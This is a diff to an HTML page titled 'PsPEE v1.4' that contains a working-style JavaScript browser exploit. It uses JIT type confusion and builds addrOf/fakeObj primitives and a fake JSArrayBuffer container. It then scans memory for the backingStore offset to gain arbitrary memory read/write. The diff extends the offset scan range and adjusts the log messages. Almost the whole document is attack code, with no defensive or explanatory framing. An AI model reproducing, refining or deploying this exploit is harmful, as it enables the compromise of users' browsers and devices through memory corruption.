@@ -2,7 +2,7 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>PsPEE v1.4 — Full R/W with Offset Scan</title>
+  <title>PsPEE v1.4 — Full R/W with Tuned Offset Scan</title>
   <style>
     body { background: black; color: lime; font-family: monospace; }
     #log { white-space: pre-wrap; padding: 1em; }
@@ -19,7 +19,7 @@
     const i2f = i => new Float64Array(new BigUint64Array([i]).buffer)[0];
     const hex = n => "0x" + n.toString(16).padStart(16, "0");
 
-    log("[*] PsPEE v1.4 — begin");
+    log("[*] PsPEE v1.4 — begin (tuned scan)");
 
     // Type confusion core
     let float_arr = [1.1,2.2,3.3];
@@ -30,7 +30,6 @@
       return tmp[1];
     }
 
-    // Expose for JIT
     function useConfuse(x) { return confuse(x); }
     function trainConfuse(fn) {
       for (let i = 0; i < 20000; i++) {
@@ -63,7 +62,7 @@
     }
     log("[+] Type confusion confirmed!");
 
-    // addrOf / fakeObj
+    // addrOf / fakeObj primitives
     function addrOf(obj) {
       try {
         obj_arr[0] = obj;
@@ -98,17 +97,17 @@
     // 4) DataView for R/W
     let dv = new DataView(ab);
 
-    // 5) Fake JSArrayBuffer container (fallback fields)
+    // 5) Fake JSArrayBuffer container fields
     let jsCellHeader, butterfly, vectorLength, backingStore;
     try { jsCellHeader = i2f(0x0108200700000000n); }
-    catch (e) { log("[WARN] jsCellHeader conv failed"); jsCellHeader = i2f(0n); }
+    catch { jsCellHeader = i2f(0n); }
     butterfly    = ab_addr;
     try { vectorLength = i2f(0x100n); }
-    catch (e) { log("[WARN] vectorLength conv failed"); vectorLength = i2f(0n); }
-    try { backingStore = i2f(ab_addr + 0x20n); }
-    catch (e) { log("[WARN] backingStore conv failed"); backingStore = jsCellHeader; }
+    catch { vectorLength = i2f(0n); }
+    // default guess, will adjust after scan
+    backingStore = i2f(ab_addr + 0x20n);
 
-    log("[DEBUG] container fields:");
+    log("[DEBUG] initial container fields:");
     log("  jsCellHeader = " + hex(f2i(jsCellHeader)));
     log("  butterfly    = " + hex(butterfly));
     log("  vectorLength = " + hex(f2i(vectorLength)));
@@ -132,7 +131,7 @@
         log("[DEBUG] read64(" + hex(addr) + ") → " + hex(v));
         return v;
       } catch (e) {
-        log("[ERROR] read64 failed: " + e);
+        log("[ERROR] read64 failed at " + hex(addr) + ": " + e);
         return null;
       }
     }
@@ -146,17 +145,18 @@
       }
     }
 
-    // 7) Sanity dump qwords of ArrayBuffer structure
-    log("[*] Sanity dump: ArrayBuffer structure (first 4 qwords)");
+    // 7) Sanity dump first 4 qwords
+    log("[*] Sanity dump: ArrayBuffer struct (first 4 qwords)");
     for (let off = 0n; off < 32n; off += 8n) {
       let v = read64(ab_addr + off);
       log(`  [${hex(off)}] → ${v === null ? "ERR" : hex(v)}`);
     }
 
     // 8) Scan for backingStore pointer offset
-    log("[*] Scanning for backingStore pointer offset...");
+    log("[*] Scanning for backingStore pointer offset (0x00→0x60)...");
     let candidates = [];
-    for (let off = 0n; off <= 0x60n; off += 8n) {
+    const initialLimit = 0x60n;
+    for (let off = 0n; off <= initialLimit; off += 8n) {
       let v = read64(ab_addr + off);
       if (v && v > 0x100000n && v < 0xFFFFFFFFFFn) {
         log(`  [POSSIBLE] offset ${hex(off)} → ${hex(v)}`);
@@ -165,16 +165,30 @@
     }
 
     if (candidates.length === 0) {
-      log("[ERROR] No backingStore candidates found—tune scan range.");
+      log("[-] No candidates in 0x00–0x60, extending scan to 0x200...");
+      const extendedLimit = 0x200n;
+      for (let off = initialLimit + 8n; off <= extendedLimit; off += 8n) {
+        let v = read64(ab_addr + off);
+        if (v && v > 0x100000n && v < 0xFFFFFFFFFFn) {
+          log(`  [POSSIBLE] offset ${hex(off)} → ${hex(v)}`);
+          candidates.push(off);
+        }
+      }
+    }
+
+    if (candidates.length === 0) {
+      log("[ERROR] No backingStore candidates found up to 0x200 — please adjust scan range manually.");
       throw "Abort: no candidates";
     }
-    let off_bs = candidates[0];
-    log("[+] Selecting offset " + hex(off_bs) + " as backingStore");
 
-    // Update container to use the real backingStore offset
+    // pick the first candidate
+    let off_bs = candidates[0];
+    log("[+] Using offset " + hex(off_bs) + " as backingStore pointer");
+
+    // update container
     container.backingStore = i2f(ab_addr + off_bs);
 
-    // 9) Verify R/W on a test object
+    // 9) Verify R/W
     let testObj = { magic: 0x1337 };
     let testAddr = addrOf(testObj);
     log("[+] testObj @ " + hex(testAddr));
@@ -187,7 +201,7 @@
       log("[ERROR] read64(testObj) failed, cannot verify write.");
     }
 
-    log("[*] Done — you now have full R/W!");
+    log("[*] Done — full R/W may now be used!");
   </script>
 </body>
 </html>
